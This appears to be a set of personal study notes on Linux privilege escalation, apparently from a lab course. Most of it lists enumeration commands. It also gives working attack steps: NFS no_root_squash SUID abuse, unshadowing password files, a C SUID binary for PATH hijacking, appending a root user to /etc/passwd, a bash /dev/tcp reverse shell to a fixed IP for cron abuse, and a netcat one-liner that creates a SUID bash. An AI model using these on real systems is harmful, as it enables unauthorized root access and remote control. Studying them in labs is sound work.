### Source that provides info on how any program with sudo rights can be used
https://gtfobins.github.io/

### NFS
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
`showmount -e [ip]` to show mounted nfs shares
check for no root_squat shares
`mkdir /tmp/whatever`
`mount -o rw [ip]:/sharename /tmp/whatever`
create suid executable and execute it on a shell

### unshadow
unshadow passwd.txt [/etc/passwd] shadow.txt [/etc/shadow] > passwords.txt

#### $PATH Way
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
create a SUID file
something like
```
#include <unistd.h>
void main()
{
	setuid(0);
	setgid(0);
	system("thm");
}
```
chmod u+s after gcc compiling the above
export PATH=/tmp/:$PATH
`echo "/bin/bash" > [Folder that's writable. temp or something]`
chmod 777 the above

### add user with root privileges
openssl passwd -1 -salt THM password1
**outputs $1$THM$WnbwlliCqxFRQepUTCkUT1**
put a line in /etc/passwd
`someone:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash`

### getcap
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.  
  
We can use the `getcap` tool to list enabled capabilities.
When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.
Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

### crontabs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  
  
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.  
  
Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.  
  
Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

use `bash -i >& /dev/tcp/10.17.47.25/6666 0>&1`

### hostname
The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

### uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

### /etc/issue

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

### ps Command

The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

-PID: The process ID (unique to the process)
-TTY: Terminal type used by the user
-Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
-CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

-`ps -A`: View all running processes
-`ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)

![](https://i.imgur.com/xsbohSd.png)  

-`ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.  

### env
The `env` command will show environmental variables.  
The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

### sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

### /etc/passwd
Reading the `/etc/passwd` file can be an easy way to discover users on the system.

### netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

-  `netstat -a`: shows all listening ports and established connections.
-  `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
-  `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
- `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
- `netstat -tp`: list connections with the service name and PID information. This can also be used with the `-l` option to list listening ports (below)
- `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
- The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;
	 `-a`: Display all sockets
	 `-n`: Do not resolve names
	 `-o`: Display timers

### find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

**Find files:**
-   `find / -type f -perm -04000 -ls 2>/dev/null`: List files that have SUID or SGID bits set
-   `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
-   `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
-   `find / -type d -name config`: find the directory named config under “/”
-   `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
-   `find / -perm a=x`: find executable files
-   `find /home -user frank`: find all files for user “frank” under “/home”
-   `find / -mtime 10`: find files that were modified in the last 10 days
-   `find / -atime 10`: find files that were accessed in the last 10 day
-   `find / -cmin -60`: find files changed within the last hour (60 minutes)
-   `find / -amin -60`: find files accesses within the last hour (60 minutes)
-   `find / -size 50M`: find files with a 50 MB size
-   `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`: find writable files and folders exempting processes

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

![](https://i.imgur.com/pSMfoz4.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).

Folders and files that can be written to or executed from:
-   `find / -writable -type d 2>/dev/null` : Find world-writeable folders
-   `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- ` find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
-  `find / -name perl*`
-  `find / -name python*`
-  `find / -name gcc*`
- 
Find specific file permissions:
Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.
-   `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

## Automated Tools
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | nc - UNIX-CLIENT:/request